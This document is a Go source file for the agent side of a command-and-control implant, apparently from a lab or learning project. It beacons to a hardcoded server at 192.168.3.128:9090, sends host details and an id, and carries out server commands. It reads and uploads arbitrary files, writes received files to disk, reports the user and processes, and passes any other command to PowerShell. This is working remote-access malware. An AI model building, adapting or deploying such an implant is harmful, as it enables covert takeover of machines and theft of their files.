package main

import (
	"commons/commons/helpers"
	"commons/commons/structures"
	"crypto/md5"
	"encoding/gob"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"

	ps "github.com/mitchellh/go-ps"
)

var (
	message  structures.Message
	waitTime = 5
)

const (
	SERVER = "192.168.3.128"
	PORT   = "9090"
)

func init() {
	message.AgentHostname, _ = os.Hostname()
	message.AgentCWD, _ = os.Getwd()
	message.AgentId = makeId()
}

func main() {
	log.Println("Started Execution")

	for {
		channel := connectServer()
		defer channel.Close()

		// Send message to server
		gob.NewEncoder(channel).Encode(message)
		// Clean commands poool
		message.Commands = []structures.Commands{}
		// Receive server message
		gob.NewDecoder(channel).Decode(&message)

		if messageContainsCommands(message) {
			for index, command := range message.Commands {
				message.Commands[index].Response = executeCommand(command.Command, index)
			}
		}
		time.Sleep(time.Duration(waitTime) * time.Second)

	}

}

func executeCommand(command string, index int) (response string) {
	// Separate the command and the arguments
	// htb -> modify the wait time
	// htb 10 -> modify the wait time to 10 seconds

	separatedCommand := helpers.SeparateCommand(command)
	baseCommand := separatedCommand[0]

	switch baseCommand {
	// ls,whoami,dir,tasklist
	// reimplement the commands to avoid calling a shell
	case "ls":
		response = listFiles()
	case "pwd":
		response = listActualDir()
	case "cd":
		// Change directory
		if len(separatedCommand[1]) > 0 {
			response = changeDir(separatedCommand[1])
		}
	case "whoami":
		response = whoAmI()
	case "ps":
		response = listProcesses()
	case "send":
		response = saveFileToDisk(message.Commands[index].File)
	case "get":
		response = sendFileToServer(message.Commands[index].Command, index)
	case "sleep":
		waitTime, _ = strconv.Atoi(strings.TrimSpace(separatedCommand[1]))
	default:
		response = executeCommandOnShell(command)
	}

	return response
}

func sendFileToServer(getCommand string, index int) (response string) {
	var err error
	response = "File sent to server"

	separatedCommand := helpers.SeparateCommand(getCommand)

	message.Commands[index].File.FileData, err = ioutil.ReadFile(separatedCommand[1])
	if err != nil {
		response = "Error reading file: " + err.Error()
		message.Commands[index].File.Error = true
	}

	message.Commands[index].File.FileName = separatedCommand[1]
	return response
}

func saveFileToDisk(file structures.File) (response string) {
	err := os.WriteFile(file.FileName, file.FileData, 0644)
	if err != nil {
		response = "Error saving file to disk"
	} else {
		response = "File saved to disk"
	}
	return response
}

func executeCommandOnShell(completeCommand string) (response string) {

	// Execute the command on the shell
	// Check the operating system
	if runtime.GOOS == "windows" {
		// Powershell
		output, _ := exec.Command("powershell.exe", "/c", completeCommand).CombinedOutput()

		response = string(output)

	} else {
		// Bash
		response = "target Operating system not supported yet"
	}

	return response
}

// $ go get github.com/mitchellh/go-ps
func listProcesses() (processes string) {
	processList, _ := ps.Processes()
	for _, process := range processList {
		// 2050 -> 2051 -> /usr/bin/gnome-terminal
		processes += fmt.Sprintf("%d -> %d -> %s\n", process.PPid(), process.Pid(), process.Executable())
	}
	return processes
}

func whoAmI() (myName string) {
	user, _ := user.Current()
	myName = user.Username
	return myName
}

func changeDir(newDir string) (response string) {
	response = "Directory changed to " + newDir
	err := os.Chdir(newDir)
	if err != nil {
		response = "Error changing directory to " + newDir
	}
	return response
}

func listActualDir() (actualDir string) {
	actualDir, _ = os.Getwd()
	return actualDir
}

func listFiles() (response string) {
	files, _ := ioutil.ReadDir(listActualDir())
	for _, file := range files {
		response += file.Name() + "\n"
	}
	return response
}
func messageContainsCommands(serverMessage structures.Message) (response bool) {
	response = false
	if len(serverMessage.Commands) > 0 {
		response = true
	}
	return response
}

func connectServer() (channel net.Conn) {
	channel, err := net.Dial("tcp", SERVER+":"+PORT)
	if err != nil {
		log.Fatalf("Error connecting to server: %v", err)
	} else {
		log.Println("Connected to server")
	}
	return channel
}

func makeId() string {
	myTime := time.Now().String()

	hasher := md5.New()
	hasher.Write([]byte(message.AgentHostname + myTime))

	return hex.EncodeToString(hasher.Sum(nil))
}
